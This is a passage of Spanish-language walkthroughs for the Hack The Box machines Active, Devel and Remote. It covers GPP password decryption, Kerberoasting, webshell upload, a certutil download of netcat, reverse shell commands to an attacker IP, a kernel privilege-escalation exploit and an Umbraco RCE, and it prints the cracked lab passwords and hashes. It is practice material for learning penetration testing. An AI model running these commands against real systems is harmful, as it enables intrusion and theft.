Not shown: 63369 closed tcp ports (conn-refused), 2144 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5722/tcp  open  msdfsr           syn-ack
9389/tcp  open  adws             syn-ack
49152/tcp open  unknown          syn-ack
49153/tcp open  unknown          syn-ack
49154/tcp open  unknown          syn-ack
49155/tcp open  unknown          syn-ack
49157/tcp open  unknown          syn-ack
49158/tcp open  unknown          syn-ack
49165/tcp open  unknown          syn-ack
49166/tcp open  unknown          syn-ack
49167/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds
</code></pre>
<h3 id="escaneo-específico-2"><a class="header" href="#escaneo-específico-2">Escaneo específico</a></h3>
<pre><code class="language-bash">❯ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49166,49167 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:30 EST
Nmap scan report for 10.10.10.100
Host is up (0.066s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-20 01:37:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-01-20T01:38:13
|_  start_date: 2022-01-20T01:34:15
|_clock-skew: 6m45s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.52 seconds
</code></pre>
<h1 id="enumeración-4"><a class="header" href="#enumeración-4">Enumeración</a></h1>
<h2 id="servicios-2"><a class="header" href="#servicios-2">Servicios</a></h2>
<h3 id="smb---445"><a class="header" href="#smb---445">smb - 445</a></h3>
<h4 id="manual-1"><a class="header" href="#manual-1">Manual</a></h4>
<p>Se identificaron folders compartidos haciendo uso de <code>smbclient</code> de los cuales se permitia el acceso anónimo al share de <code>Replication</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Active/images/enum_1.png" alt="Shares disponibles de smb" /></p>
<p>Al conectarse al directorio compartido de <code>Replication</code> se usaron los comandos:</p>
<ol>
<li><code>prompt off</code> - Para deshabilitar la confirmación al descargar cualquier archivo.</li>
<li><code>recurse on</code> - Para habilitar la recursividad si se llega a encontrar un directorio.</li>
<li><code>mget *</code> - Para descargar todos los archivos y directorios disponibles.</li>
</ol>
<p>Se identificó un archivo el cual expone un usuario y un hash disponible para crackear.</p>
<p><img src="htb/boxes/windows/1_facil/Active/images/enum_2.png" alt="Directorios y archivos descargados" /></p>
<p>Contenido de <code>Groups.xml</code>:</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;
&lt;/Groups&gt;
</code></pre>
<h1 id="explotación-2"><a class="header" href="#explotación-2">Explotación</a></h1>
<h2 id="descrifrado-de-gpp"><a class="header" href="#descrifrado-de-gpp">Descrifrado de GPP</a></h2>
<h3 id="ejecución-9"><a class="header" href="#ejecución-9">Ejecución</a></h3>
<p>Al identificar qué tipo de credencial es la que se encuentra en <code>Groups.xml</code> se identificó una vulnerabilidad relacionada con las <a href="https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/">Group Policy Preferences</a>, dado el leak de la llave y suponiendo que la máquina no se encuentra parchada se puede descifrar la contraseña haciendo uso de <code>gpp-decrypt</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Active/images/exploit_1.png" alt="Resultado de gpp-decrypt" /></p>
<h2 id="kerberoasting-1"><a class="header" href="#kerberoasting-1">Kerberoasting</a></h2>
<h3 id="ejecución-10"><a class="header" href="#ejecución-10">Ejecución</a></h3>
<p>Dados los puertos abiertos que tiene la máquina se puede intuir que la máquina objetivo es un Domain Controller, contemplado esto y que se cuenta con credenciales se puede hacer uso de <code>impacket-GetUserSPNs</code> para buscar conseguir un hash de alguna otra cuenta que permita el acceso a la máquina. Utilizando:</p>
<pre><code class="language-bash">impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
</code></pre>
<p><img src="htb/boxes/windows/1_facil/Active/images/exploit_2.png" alt="Error de sesión por sincronización" /></p>
<p>Al identificar el error de sesión señalado debido a que la hora de la máquina no corresponde con la que se utiliza, se ocupa <code>ntpdate</code> para sincronizar la hora local con la de la máquina objetivo, señalando que el único comportamiento funcional encontrado fue utilizando el hostname de la máquina por lo que se modificó <code>/etc/hosts</code> para añadir la entrada del hostname con la IP, configurando así la hora local.</p>
<p>Posteriormente se ejecutó de nuevo la herramienta de impacket para obtener el hash.</p>
<p><img src="htb/boxes/windows/1_facil/Active/images/exploit_3.png" alt="Sincronización y obtención de hash" /></p>
<p>Hash obtenido:</p>
<pre><code class="language-text">$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b9225835ed0789a77d29228e13c82766$9bf95664d6316261f490688514dadd5470eb70fed87666be26d2e2fbe30691d7ce3377cf176e3bb2e0d459a6a7d25153e89ef9a44d13e16012e3ba81bc3b19a84653d112df3c4e21329bed80b91938da785d8aed471821a4c990559930aee3312e70cccdbbeb52c3c454c4d4b712c9ebf66602062bfc993d7de4c4250f8706a98b75109467a74522538816a92d462c8e7279556c4f3e4f9fe8447d326876fa169608c143847436fb761b2f0aa5122b90f5af045b73a1d2fa2a7e9f432fab538302dc6575d1d5095e89e7d66febce084b6fad6deb79cbd1db17f7cbd49907b0bed27958ade09ef2ed7baaf1e18d5d368c5c29aa614e8584669dd8d6a4d52bdebabfdaa48b68b4db41411aef874ea76c301b9fff65f81c48822e263530b788cc75231fdd78c3879ad254e92edbe4b7efb8909d37ec1699f58b75a32b73da4fca77ae566d5b3c1b1ae67a74cae08988429d54694bc1f3030cbc5aa59113b35129a98f2c32d6faa69816facb1153327d242019a5a2aad1ba5420449421a39b6a250e424ed9d8863edb0429ff54d33df78d3bed41ac41ca509250750cfc4db6dc91ced953db230554b681fd5569407664542f2fac85f3d385ca42038c9d8e7eaacfe07dd480efeeb6843127d084b0a08be254bfe9166e810108590e7e064bbe36e3d3a6faf5d05fab1015536cc34b8cdc27d80450a0b139bcd8ece127c6600218c3d1a75558aac8bf3094a5ca6d98bfc309b89d7e7fb1a03df601d98be07e26fa746629a5fa7492e489154348dcfd29800ab9fc49bb793a430510564a8525da693112b9243a4840b59360e7ca1d449f5faf35a15aa4902d94c1ed0dca1b3d8c0ea083f4c823f17c730c9bfbdb9c93abc9250cdface8a4da66da5c6868c4de96f344c4102ab56be8385237a0755ac26a8f7119fc55e698748c14ae37ec11c8a4e534e2ebf99c12877b64bf9ef636d487afee40de5115a5aff0f8ca7a2f059b4e56db5dea6069fc56ece3bd63d47b13889cad441635f6ac03d5688ea7041811ff55a462e0292bfe1f234b8a5994dd8efe0b4fde336d4815026e80ae3f96a9d025db0d9ba55183ed2a53e8b3f002e3aa5d3f744f8b46322dba0918130fc0b7f4a85342cae3a14fc9a555983668dd5c7ad63934a407e7a055c610b371bf3772c8e85b173ab9bdb22f76e9fbef451678abfb3db0a300d0c18db7ba907536d1dc3008b4488fee3d4bde9e8d719001bb7ebdf66df8f18132eb9d2d867d207bcb
</code></pre>
<p>Lo que resultaría en buscar el crackeo del hash obtenido (ejecutándolo en esta ocasión usando <code>john</code>) para poder obtener acceso a la máquina, haciendo uso de <code>impacket-psexec</code> proporcionando las credenciales obtenidas.</p>
<p><img src="htb/boxes/windows/1_facil/Active/images/exploit_4.png" alt="Crackeo usando john" /></p>
<p><img src="htb/boxes/windows/1_facil/Active/images/exploit_5.png" alt="Acceso como Administrator" /></p>
<h2 id="credenciales-obtenidas"><a class="header" href="#credenciales-obtenidas">Credenciales obtenidas</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Alcance</th><th>Usuario</th><th>Contraseña (hash → pass)</th><th>Fuente</th></tr></thead><tbody>
<tr><td>SO</td><td>SVC_TGS</td><td><code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code> → GPPstillStandingStrong2k18</td><td>smb (<code>Groups.xml</code>) + <code>gpp-decrypt</code></td></tr>
<tr><td>SO</td><td>Administrator</td><td><code>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b92258...</code> → Ticketmaster1968</td><td><code>impacket-GetUserSPNs</code> + cracking</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-3"><a class="header" href="#estadísticas-3">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/3">Devel</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Easy</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/1_facil/Devel/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>20</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/1">ch4p</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-3"><a class="header" href="#reconocimiento-3">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-3"><a class="header" href="#escaneo-de-host-3">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-3"><a class="header" href="#escaneo-completo-de-puertos-3">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">└─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:23 EDT
Initiating Connect Scan at 10:23
Scanning 10.10.10.5 [65535 ports]
Discovered open port 21/tcp on 10.10.10.5
Discovered open port 80/tcp on 10.10.10.5
Connect Scan Timing: About 26.80% done; ETC: 10:25 (0:01:25 remaining)
Completed Connect Scan at 10:25, 112.65s elapsed (65535 total ports)
Nmap scan report for 10.10.10.5
Host is up, received user-set (0.064s latency).
Scanned at 2022-06-16 10:23:39 EDT for 113s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 112.68 seconds
</code></pre>
<h3 id="escaneo-específico-3"><a class="header" href="#escaneo-específico-3">Escaneo específico</a></h3>
<pre><code class="language-bash">└─$ nmap -sCV -p 80,21 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 10:29 EDT
Nmap scan report for 10.10.10.5
Host is up (0.064s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
</code></pre>
<h1 id="enumeración-5"><a class="header" href="#enumeración-5">Enumeración</a></h1>
<h2 id="servicios-3"><a class="header" href="#servicios-3">Servicios</a></h2>
<h3 id="ftp---21"><a class="header" href="#ftp---21">ftp - 21</a></h3>
<p>Si bien se buscó analizar el servicio http, no se encontró nada relevante que pudiera sobresalir para la fase de explotación, salvo la recopilación de información ya presente en el escaneo de nmap el cuál presenta la versión del servidor IIS presente.</p>
<p>Al identificar mediante el escaneo específico de nmap el logueo por medio de la cuenta anónima que ofrecen los servidores ftp, se buscó ingresar para visualizar qué archivos se encontraban presentes y si además de permitir el listado de estos, se permitía la escritura en el directorio.</p>
<p>Al visualizar los archivos disponibles se identificó que correspondían con los archivos relacionados al servidor web en cuestión, por lo que al cargar un archivo de prueba se buscó visualizarlo mediante el navegador, corroborando así un camino de explotación mediante la ejecución de código.</p>
<p><img src="htb/boxes/windows/1_facil/Devel/images/enum_1.png" alt="Carga de archivo de prueba" /></p>
<p>Visualización en navegador</p>
<p><img src="htb/boxes/windows/1_facil/Devel/images/enum_2.png" alt="Visualización en navegador" /></p>
<h1 id="explotación-3"><a class="header" href="#explotación-3">Explotación</a></h1>
<h2 id="rce"><a class="header" href="#rce">RCE</a></h2>
<p>De acuerdo a la tecnología empleada se buscó cargar una webshell de <code>asp</code> para ejecutar comandos en la máquina, la cual se puede ubicar en <code>/usr/share/webshells/asp</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Devel/images/exploit_1.png" alt="Carga de archivos" /></p>
<p>Por lo que después de la carga del binario de netcat mediante:</p>
<pre><code class="language-powershell">certutil.exe -f -urlcache http://10.10.14.16/nc.exe c:\windows\temp\nc.exe
</code></pre>
<p>Se obtuvo una reverse shell como <code>iis apppool\web</code> entablandola con:</p>
<pre><code class="language-powershell">c:\windows\temp\nc.exe -e cmd.exe 10.10.14.16 1234
</code></pre>
<p><img src="htb/boxes/windows/1_facil/Devel/images/exploit_2.png" alt="Carga de nc.exe" /></p>
<p>Reverse shell entablada:</p>
<p><img src="htb/boxes/windows/1_facil/Devel/images/exploit_3.png" alt="Reverse shell" /></p>
<h1 id="post-explotación-3"><a class="header" href="#post-explotación-3">Post Explotación</a></h1>
<h2 id="enumeración-6"><a class="header" href="#enumeración-6">Enumeración</a></h2>
<p>Al identificar mediante <code>systeminfo</code> que se trataba de una versión vieja de Windows 7, sumando que en la misma información mostrada por el comando no se visualizaba ningún parche instalado, se asumió que la ruta de escalación iba intencionada a realizarse por medio de explotación de kernel.</p>
<p><img src="htb/boxes/windows/1_facil/Devel/images/post_1.png" alt="Información de sistema" /></p>
<h2 id="escalación-de-privilegios-2"><a class="header" href="#escalación-de-privilegios-2">Escalación de privilegios</a></h2>
<h3 id="nt-apppoolweb--nt-authoritysystem"><a class="header" href="#nt-apppoolweb--nt-authoritysystem">nt apppool\web → nt authority\system</a></h3>
<p>Después de ocupar el <a href="https://github.com/SecWiki/windows-kernel-exploits">repositorio de exploits de kernel de windows</a> para buscar alguno que fuera a la par de la fecha y acorde a la versión del sistema operativo, se encontró que el exploit relacionado a <code>MS10-59</code> era operativo pero debido a que el presente en el repositorio es presentado mediante una prueba de concepto la cual retorna una shell lanzando otro proceso/ventana y no en la presente a donde se ejecuta.</p>
<p>Se optó por buscar alguna otra prueba de concepto que permitiera otro enfoque, encontrando así otro <a href="https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled">repositorio del mismo exploit</a> el cuál mediante la especificación de la IP de escucha y puerto permite entablar una reverse shell como <code>nt authority\system</code>, obteniendola mediante:</p>
<pre><code class="language-powershell">.\churri.exe 10.10.14.16 4321
</code></pre>
<p><img src="htb/boxes/windows/1_facil/Devel/images/post_2.png" alt="Acceso como nt authority\system" /></p>
<h1 id="referencias-6"><a class="header" href="#referencias-6">Referencias</a></h1>
<ul>
<li><a href="https://github.com/SecWiki/windows-kernel-exploits">Windows Kernel Exploits</a>.</li>
<li><a href="https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled">egre55 - MS10-059</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-4"><a class="header" href="#estadísticas-4">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/234">Remote</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Easy</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/1_facil/Remote/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>20</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/2984">mrb3n</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-4"><a class="header" href="#reconocimiento-4">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-4"><a class="header" href="#escaneo-de-host-4">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-4"><a class="header" href="#escaneo-completo-de-puertos-4">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:05 EDT
Initiating SYN Stealth Scan at 09:05
Scanning 10.10.10.180 [65535 ports]
Discovered open port 80/tcp on 10.10.10.180
Discovered open port 111/tcp on 10.10.10.180
Discovered open port 445/tcp on 10.10.10.180
Discovered open port 135/tcp on 10.10.10.180
Discovered open port 139/tcp on 10.10.10.180
Discovered open port 21/tcp on 10.10.10.180
Discovered open port 49664/tcp on 10.10.10.180
Discovered open port 49665/tcp on 10.10.10.180
Discovered open port 5985/tcp on 10.10.10.180
Discovered open port 49667/tcp on 10.10.10.180
Discovered open port 49678/tcp on 10.10.10.180
Discovered open port 47001/tcp on 10.10.10.180
Discovered open port 49680/tcp on 10.10.10.180
Discovered open port 49666/tcp on 10.10.10.180
Discovered open port 49679/tcp on 10.10.10.180
Discovered open port 2049/tcp on 10.10.10.180
Completed SYN Stealth Scan at 09:05, 13.25s elapsed (65535 total ports)
Nmap scan report for 10.10.10.180
Host is up, received user-set (0.068s latency).
Scanned at 2022-06-02 09:05:13 EDT for 13s
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
111/tcp   open  rpcbind      syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
2049/tcp  open  nfs          syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49678/tcp open  unknown      syn-ack ttl 127
49679/tcp open  unknown      syn-ack ttl 127
49680/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
           Raw packets sent: 65924 (2.901MB) | Rcvd: 65535 (2.621MB)
</code></pre>
<h3 id="escaneo-específico-4"><a class="header" href="#escaneo-específico-4">Escaneo específico</a></h3>
<pre><code class="language-bash">└─$ nmap -sCV -p 21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 09:08 EDT
Nmap scan report for 10.10.10.180
Host is up (0.064s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-06-02T13:09:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.15 seconds
</code></pre>
<h1 id="enumeración-7"><a class="header" href="#enumeración-7">Enumeración</a></h1>
<h2 id="servicios-4"><a class="header" href="#servicios-4">Servicios</a></h2>
<h3 id="http---80-2"><a class="header" href="#http---80-2">http - 80</a></h3>
<h4 id="ffuf-1"><a class="header" href="#ffuf-1">ffuf</a></h4>
<p>Al navegar a través del sitio disponible y no encontrar información relevante en primera instancia, se decidió enumerar directorios de manera automática mediante:</p>
<pre><code class="language-bash">ffuf -c -ic -u http://10.10.10.180/FUZZ -w /usr/share/dirb/wordlists/common.txt
</code></pre>
<p>Encontrando así el directorio <code>umbraco</code> el cual no pareció común bajo el contexto del sitio.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/enum_1.png" alt="Directorio encontrado" /></p>
<h4 id="manual-2"><a class="header" href="#manual-2">Manual</a></h4>
<p>Al navegar manualmente al directorio se visualizó un login, a lo que posteriormente se buscó información relacionada encontrando que se trataba de un sistema de gestor de contenidos (CMS).</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/enum_2.png" alt="Navegación a umbraco" /></p>
<p>Al buscar rutas de explotación se encontró un <a href="https://www.exploit-db.com/exploits/49488">exploit</a> (junto con <a href="https://github.com/noraj/Umbraco-RCE">su repositorio</a>) el cuál para ser ejecutado se requiere contar con credenciales válidas, abriendo paso a dos consideraciones de camino a la fase de explotación:</p>
<ul>
<li>Realizar búsqueda de credenciales por algún sitio <em>(preferente)</em>.</li>
<li>Realizar fuerza bruta al login <em>(siempre último recurso)</em>.</li>
</ul>
<h3 id="mountd---2049"><a class="header" href="#mountd---2049">mountd - 2049</a></h3>
<p>Al identificar el servicio y encontrar que se trataba de exposición de puntos de montaje a través de red, se hizo uso de <code>showmount -e 10.10.10.180</code> visualizando así el montaje <code>site_backups</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/enum_3.png" alt="Puntos de montaje disponibles" /></p>
<p>Posteriormente, para poder navegar a través del directorio e interactuar cómodamente se creó la carpeta <code>/mnt/remote</code> y se ejecutó:</p>
<pre><code class="language-bash">sudo mount -t nfs 10.10.10.180:site_backups /mnt/remote -o nolock
</code></pre>
<p>Para montar ahí lo expuesto en el servidor.</p>
<p>Teniendo en consideración la búsqueda de credenciales, se buscaron patrones en texto claro en el punto de montaje.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/enum_4.png" alt="Búsqueda de password" /></p>
<p>Al buscar en los contenidos de los archivos señalados (los que resultaron más atractivos) se encontró en el archivo <code>UmbracoTraceLog.intranet.txt</code> un usuario potencial que se utilizó para continuar con la búsqueda de información.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/enum_5.png" alt="Correo expuesto" /></p>
<p>Utilizando lo encontrado, se procedió a hacer otra búsqueda descartando así múltiples archivos permitiendo verificar otros que con anterioridad no se revisaron.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/enum_6.png" alt="Descarte de archivos" /></p>
<p>Al ser interpretado como binario, se uso:</p>
<pre><code class="language-bash">strings Umbraco.pdf
</code></pre>
<p>Para interpretar los caracteres legibles identificando así las credenciales <code>admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/enum_7.png" alt="Credenciales expuestas" /></p>
<h1 id="explotación-4"><a class="header" href="#explotación-4">Explotación</a></h1>
<h2 id="cracking-de-hash-obtenido"><a class="header" href="#cracking-de-hash-obtenido">Cracking de hash obtenido</a></h2>
<p>Guardando el hash del usuario admin en un archivo y haciendo uso de:</p>
<pre><code class="language-bash">john hashes --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>
<p>Se obtuvo la contraseña <code>admin@htb.local:baconandcheese</code>.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/exploit_1.png" alt="Crackeo de hash" /></p>
<h2 id="rce-1"><a class="header" href="#rce-1">RCE</a></h2>
<p>Después de validar las credenciales con el portal de umbraco y descargar el exploit previamente encontrado, se ejecutó:</p>
<pre><code class="language-bash">python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
</code></pre>
<p>Para corroborar su uso.</p>
<p><img src="htb/boxes/windows/1_facil/Remote/images/exploit_2.png" alt="Ejecución de comando whoami" /></p>
<p>Haciendo uso de <a href="https://www.revshells.com/">Reverse Shell Generator</a> se generó una reverse shell de powershell en base64 para entablar la conexión con:</p>
<pre><code class="language-bash">python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-e JABjAGwAaQBlAG4AdAAg[...]'
</code></pre>
<p><img src="htb/boxes/windows/1_facil/Remote/images/exploit_3.png" alt="Reverse shell" /></p>
<h1 id="post-explotación-4"><a class="header" href="#post-explotación-4">Post Explotación</a></h1>
<h2 id="enumeración-8"><a class="header" href="#enumeración-8">Enumeración</a></h2>
<p>Verificando los privilegios que se tienen con el usuario obtenido haciendo uso de:</p>
<pre><code class="language-powershell">whoami /all
</code></pre>
